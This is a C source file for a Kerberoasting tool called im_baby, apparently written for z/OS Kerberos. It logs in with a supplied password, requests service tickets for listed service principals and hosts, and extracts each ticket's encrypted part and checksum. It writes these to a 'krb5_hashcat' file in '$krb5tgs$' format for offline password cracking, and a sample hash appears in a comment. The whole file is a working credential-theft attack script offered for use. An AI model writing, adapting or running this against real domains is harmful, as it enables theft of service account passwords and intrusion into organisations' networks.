#include <stdio.h>
#include <stdlib.h>
#include <skrb/krb5.h>
/*c89 -2 -DS390 -Wc,"DLL,NOANSIALIAS" -Wl,DLL -o im_baby im_baby.c /usr/lib/EUVFKDLL.x -lskrb*/
/*im_baby realm client_princ client_pass spn_file hosts_file*/
/*$krb5tgs$18$user$realm$8efd91bb01cc69dd07e46009$7352410d6aafd72c64972a66058b02aa1c28ac580ba41137d5a170467f06f17faf5dfb3f95ecf4fad74821fdc7e63a3195573f45f962f86942cb24255e544ad8d05178d560f683a3f59ce94e82c8e724a3af0160be549b472dd83e6b80733ad349973885e9082617294c6cbbea92349671883eaf068d7f5dcfc0405d97fda27435082b82b24f3be27f06c19354bf32066933312c770424eb6143674756243c1bde78ee3294792dcc49008a1b54f32ec5d5695f899946d42a67ce2fb1c227cb1d2004c0*/
/*last entry in files need to have space at the end*/
void substring(char [], char[], int, int);

int main(int argc, char *argv[])
{
   krb5_error_code retval;
   krb5_ccache cc;
   krb5_creds tgt_creds, tgs_creds, service_creds;
   krb5_context context;
   krb5_creds* point_service_creds = &service_creds;

   char client_full[128];
   char krbtgt_full[128];
   char service_full[128];
   char service_file[128];

   FILE *fptr_output;
   FILE *fptr_spns;
   FILE *fptr_hosts;
   FILE *fptr_hashes = fopen("krb5_hashcat", "w");

   char* realm;
   char* client_princ;
   char* client_pass;
   char* spns_file;
   char* hosts_file;
   int enc_type = 18;

   char spns[20][128];
   int  spns_size = 0;
   char hosts[20][128];
   int  hosts_size = 0;


   int i;
   int p;
   int z;
   int y;
   int h;

   int buffer_length = 1000;
   char buffer[1000];

   int hex_ticket_length = 1000;
   char hex_ticket[1000];
   char hex_cipher_length[100];
   int cipher_length;
   char cipher[1000];
   char checksum[300];



   if( argc == 6 ) {
       realm = argv[1];
       client_princ = argv[2];
       client_pass = argv[3];
       spns_file = argv[4];
       hosts_file = argv[5];
   }
   else
   {
       printf("./im_baby.c realm client_princ client_pass spn_file hosts_file\n");
       exit(0);
   }

   fptr_spns = fopen(spns_file, "r");
   fptr_hosts = fopen(hosts_file, "r");

   printf("\nStarting im_baby.c [A Jake Labelle Production]\n");

   printf("\nSpns:\n");
   while(fgets(buffer, buffer_length, fptr_spns)) {
       buffer[strlen(buffer) - 1] = 0;
       strcpy(spns[spns_size], buffer);
       printf("%s\n",spns[spns_size]);
       spns_size = spns_size + 1;
   }

   printf("\nHosts:\n");
   while(fgets(buffer, buffer_length, fptr_hosts)) {
       buffer[strlen(buffer) - 1] = 0;
       strcpy(hosts[hosts_size], buffer);
       printf("%s\n",hosts[hosts_size]);
       hosts_size = hosts_size + 1;
   }

   retval = krb5_init_context(&context);
   if (retval) {
       printf("%s\n","Failed to init context");
       exit(0);
   }
   retval = krb5_cc_default(context, &cc);
   if (retval) {
       printf("%s\n","Failed to get default cc");
       exit(0);
   }

   snprintf(client_full, 128, "%s@%s",  client_princ, realm);
   snprintf(krbtgt_full, 128, "%s/%s@%s",  "krbtgt", realm,  realm);

   retval = krb5_parse_name(context, client_full, &tgt_creds.client);
   retval = krb5_parse_name(context, krbtgt_full, &tgt_creds.server);

   retval = krb5_cc_initialize(context, cc, tgt_creds.client);

   if (retval) {
       printf("%s\n","Failed to init cc");
       exit(0);
   }



   retval = krb5_get_in_tkt_with_password(context,KDC_OPT_FORWARDABLE,NULL,NULL, NULL,client_pass, cc, &tgt_creds, NULL);
   if (retval) {
       printf("%s\n","Failed to get TGT");
       exit(0);

   }
   printf("\nTGT acquired, attempting to find Service Principals:\n");

   for (i = 0; i < spns_size; ++i)
   {
      snprintf(service_full, 128, "%s@%s",  spns[i], realm);
      snprintf(service_file, 128, "%s.ticket",  spns[i]);
      printf("Attempting %s\n",service_full);
      retval = krb5_parse_name(context, client_full, &tgs_creds.client);
      retval = krb5_parse_name(context, service_full, &tgs_creds.server);
      tgs_creds.keyblock.enctype = enc_type;
      tgs_creds.authdata = NULL;
      tgs_creds.second_ticket = tgt_creds.ticket;
      retval = krb5_get_cred_via_tkt(context, &tgt_creds, 0x40000000, NULL,&tgs_creds, &point_service_creds);

      if (retval) {
          printf("%s\n","TGS not found");
      }
      else
      {
          printf("%s\n","TGS found");
          fptr_output = fopen(service_file,"w");
          for (z = 0; z < point_service_creds->ticket.length; z++)
          {
              fprintf(fptr_output,"%02X", point_service_creds->ticket.data[z]);
          }
          fclose(fptr_output);
          fptr_output = fopen(service_file,"r");
          fgets(hex_ticket, hex_ticket_length, fptr_output);
          fclose(fptr_output);
          for (y = 0; y < strlen(hex_ticket) - 10; y = y + 2)
          {
              if(hex_ticket[y] == '0' && hex_ticket[y+1] == '4' && hex_ticket[y+2] == '8' && hex_ticket[y+3] == '1')
              {
                  if(hex_ticket[y+2] == '8' && hex_ticket[y+3] == '1')
                  {
                      hex_cipher_length[0] = hex_ticket[y+4];
                      hex_cipher_length[1] = hex_ticket[y+5];
                      cipher_length = hex_convert(hex_cipher_length);
                      for (h = 0; h < (cipher_length * 2) - 24; h++)
                      {
                          cipher[h] = hex_ticket[y+6+h];
                      }
                      cipher[h] = 0;
                      for (h = 0; h < 24; h++)
                      {
                          checksum[h] = hex_ticket[y+6+h+(cipher_length * 2) - 24];
                      }
                      checksum[h] = 0;
                      fprintf(fptr_hashes, "$krb5tgs$%d$%s$%s$%s$%s\n",enc_type,spns[i],realm,checksum,cipher);
                  }
                  if(hex_ticket[y+2] == '8' && hex_ticket[y+3] == '2' && hex_ticket[y+4] == '0' && hex_ticket[y+5] == '1')
                  {

                  }
              }
          }

      }

       for (p = 0; p < hosts_size; ++p)
       {

           snprintf(service_full, 128, "%s/%s@%s",  spns[i], hosts[p], realm);
           snprintf(service_file, 128, "%s%s.ticket",  spns[i], hosts[p]);
           printf("Attempting %s\n",service_full);
           retval = krb5_parse_name(context, client_full, &tgs_creds.client);
           retval = krb5_parse_name(context, service_full, &tgs_creds.server);
           tgs_creds.keyblock.enctype = enc_type;
           tgs_creds.authdata = NULL;
           tgs_creds.second_ticket = tgt_creds.ticket;
           retval = krb5_get_cred_via_tkt(context, &tgt_creds, 0x40000000, NULL,&tgs_creds, &point_service_creds);
           if (retval) {
               printf("%s\n","TGS not found");
           }
           else
           {
               printf("%s\n","TGS found");
               fptr_output = fopen(service_file,"w");
               for (z = 0; z < point_service_creds->ticket.length; z++)
               {
                   fprintf(fptr_output,"%02X", point_service_creds->ticket.data[z]);
               }
               fclose(fptr_output);
               fptr_output = fopen(service_file,"r");
               fgets(hex_ticket, hex_ticket_length, fptr_output);
               fclose(fptr_output);
               for (y = 0; y < strlen(hex_ticket) - 10; y = y + 2)
               {
                   if(hex_ticket[y] == '0' && hex_ticket[y+1] == '4' && hex_ticket[y+2] == '8' && hex_ticket[y+3] == '1')
                   {
                       if(hex_ticket[y+2] == '8' && hex_ticket[y+3] == '1')
                       {
                           hex_cipher_length[0] = hex_ticket[y+4];
                           hex_cipher_length[1] = hex_ticket[y+5];
                           cipher_length = hex_convert(hex_cipher_length);
                           for (h = 0; h < (cipher_length * 2) - 24; h++)
                           {
                               cipher[h] = hex_ticket[y+6+h];
                           }
                           cipher[h] = 0;
                           for (h = 0; h < 24; h++)
                           {
                               checksum[h] = hex_ticket[y+6+h+(cipher_length * 2) - 24];
                           }
                           checksum[h] = 0;
                           fprintf(fptr_hashes, "$krb5tgs$%d$%s%s$%s$%s$%s\n",enc_type,spns[i],hosts[p],realm,checksum,cipher);
                       }
                       if(hex_ticket[y+2] == '8' && hex_ticket[y+3] == '2' && hex_ticket[y+4] == '0' && hex_ticket[y+5] == '1')
                       {

                       }
                   }
               }

           }
       }
   }

   krb5_cc_close(context, cc);
   krb5_free_context(context);
   return 0;
}

int hex_convert(char* hex)
{
    int first_int;
    int second_int;
    if(hex[0] == 'A')
    {
        first_int = 10;
    }
    else if(hex[0] == 'B')
    {
        first_int = 11;
    }
    else if(hex[0] == 'C')
    {
        first_int = 12;
    }
    else if(hex[0] == 'D')
    {
        first_int = 13;
    }
    else if(hex[0] == 'E')
    {
        first_int = 14;
    }
    else if(hex[0] == 'F')
    {
        first_int = 15;
    }
    else
    {
        first_int = hex[0] - '0';
    }
    if(hex[1] == 'A')
    {
        second_int = 10;
    }
    else if(hex[1] == 'B')
    {
        second_int = 11;
    }
    else if(hex[1] == 'C')
    {
        second_int = 12;
    }
    else if(hex[1] == 'D')
    {
        second_int = 13;
    }
    else if(hex[1] == 'E')
    {
        second_int = 14;
    }
    else if(hex[1] == 'F')
    {
        second_int = 15;
    }
    else
    {
        second_int = hex[1] - '0';
    }
    return (first_int * 16) + second_int;
}
